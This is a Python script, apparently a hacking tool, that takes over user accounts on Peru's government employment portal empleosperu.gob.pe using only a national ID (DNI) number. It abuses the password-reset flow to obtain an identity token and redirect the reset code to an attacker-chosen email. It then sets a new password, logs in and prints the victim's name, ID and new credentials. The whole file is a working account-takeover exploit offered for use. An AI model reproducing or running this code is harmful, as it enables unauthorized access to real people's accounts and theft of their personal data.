import requests
import json
import time
import random
from colorama import Fore,init
init()

v = Fore.LIGHTGREEN_EX
r = Fore.RED
c = Fore.CYAN
w = Fore.WHITE
r = Fore.RESET

url_base = "https://www.empleosperu.gob.pe"

def GenerarJWT(dni):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Referer": "https://www.empleosperu.gob.pe/portal-mtpe/"
    }
    env = requests.get(f"{url_base}/usermanagement/usuario/resetpassword/verificar?id-documento=10080399&nu-documento={dni}", headers=headers)
    if env.status_code == 200:
        dataJson = env.json()
        token = dataJson['data']['token']['token']
        email = dataJson['data']['sEmail']
        print(f"{v}SE ENCONTRÓ LA CUENTA REGISTRADA: {email}")
        return token
    else:
        print("Ocurrio un error en la consulta")
        exit()

def bypassCorreo(dni,correo):
    token = GenerarJWT(dni)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Referer": "https://www.empleosperu.gob.pe/portal-mtpe/",
        "X-Validate-Identity": token
    }
    env = requests.post(f"{url_base}/usermanagement/email/enviar", headers=headers, json={"nInMotivo":10140202,"sEmailTo": correo})
    if env.status_code == 200:
        dataJson = env.json()
        succes = dataJson['succes']
        if succes == True:
            print(f"Mire el correo electronico {correo} y inserte el codigo.")
            return token
    else:
        print("Ocurrio un error")

def bypassPassword(dni,correo):
    token = bypassCorreo(dni,correo)
    codigo = input("ESCRIBE EL CODIGO QUE LLEGÓ AL CORREO: ")
    password = input("ESCRIBE LA CONTRASEÑA NUEVA QUE QUIERAS: ")
    celular = '9' + str(random.randint(0, 99999999)).zfill(8)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Referer": "https://www.empleosperu.gob.pe/portal-mtpe/",
        "X-Validate-Identity": token,
        "Cookie": "wcc-swipe-language=es-pe"
    }
    env = requests.post(f"{url_base}/usermanagement/usuario/resetpassword/confirmar", headers=headers, json={"bIndicadorEmail":True,"nInDocIdentidad":10080399,"sCodigoCelular":"","sCodigoEmail": codigo,"sNuDocIdentidad": dni,"sNumeroCelular": celular,"sEmail": correo,"sPassword": password,"sRePassword": password})
    if env.status_code == 200:
        print(f"{v}SE HIZO BYPASS DE LA CUENTA EXITOSAMENTE :){r}")
        x = input("Desea probar las credenciales? y/n: ")
        if x == "y" or "Y":
            ProbarCuentaHack(dni,password)
        else:
            print("Happy Hacking :)")
            exit()

def ProbarCuentaHack(dni,password):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Referer": "https://www.empleosperu.gob.pe/portal-mtpe/",
        "Cookie": "wcc-swipe-language=es-pe"
    }
    env = requests.post(f"{url_base}/usermanagement/login", headers=headers, json={"sNumeroDocumentoIdentidad": dni,"password": password,"nIdTipoDocumentoIdentidad":10080399,"params":{"clientId":"portal-mtpe","redirectUri":"https://www.empleosperu.gob.pe/portal-mtpe/#/","responseType":"","scope":"","state":"","nonce":"","uiLocales":"","consultorReq":False}})
    if env.status_code==200:
        SID = env.json()['data']['sSid']
        env2 = requests.get(f"{url_base}/oauth/r/token?SID={SID}&operation=check", headers=headers)
        datos = env2.json()
        print(f"{w}[+]{v} NOMBRE: "+datos['nombres'])
        print(f"{w}[+]{v} APELLIDO PATERNO: "+datos['apPaterno'])
        print(f"{w}[+]{v} APELLIDO MATERNO: "+datos['apMaterno'])
        print(f"{w}[+]{v} ID: "+datos['idPersona'])
        print(f"{w}[+]{v} CORREO NUEVO: "+datos['email'])
        print("")
        print(f"{w}[+]{v} USUARIO: {c}{dni}")
        print(f"{w}[+]{v} CONTRASEÑA: {c}{password}")
        
    else:
        print("XD NO FUNCIONÓ")

def main():
    print(f"""{v}
    ▄▖▄▖▄▖▄▖▄▖▄▖▄▖▄▖▄▖
    ▌ ▙▖▙▘▐ ▐ ▙▌▌▌▚ ▚ 
    ▙▖▙▖▌▌▐ ▟▖▌ ▛▌▄▌▄▌
                    
    by: RasmusKernel :)
    """)
    print(f"{r}===========================================================")
    print(F"{v}BYPASS SISTEMA DE CERTIFICADOS LABORALES PERU - CUENTAS    ")
    dni = input("ESCRIBE EL NUMERO DE DNI A QUERER ENTRAR A SU CUENTA: ")
    correo = input("ESCRIBE UN CORREO A DONDE LLEGARAN LAS INSTRUCCIONES: ")
    print(f"{r}===========================================================")
    time.sleep(2)
    print("INICIANDO ...")
    bypassPassword(dni, correo)

if __name__ == "__main__":
    main()